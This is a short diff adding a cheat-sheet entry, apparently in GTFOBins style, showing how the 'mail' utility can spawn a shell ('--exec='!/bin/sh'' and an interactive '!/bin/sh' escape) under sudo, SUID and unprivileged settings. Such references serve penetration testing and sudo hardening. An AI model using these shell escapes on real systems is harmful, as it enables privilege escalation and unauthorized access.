@@ -1,0 +1,26 @@
+mail
+====
+
+Shell
+-----
+
+[Sudo]
+    mail --exec='!/bin/sh'
+
+[SUID]
+    mail --exec='!/bin/sh'
+
+[Unprivileged]
+    mail --exec='!/bin/sh'
+
+[Sudo]
+    mail -f /etc/hosts
+!/bin/sh
+
+[SUID]
+    mail -f /etc/hosts
+!/bin/sh
+
+[Unprivileged]
+    mail -f /etc/hosts
+!/bin/sh
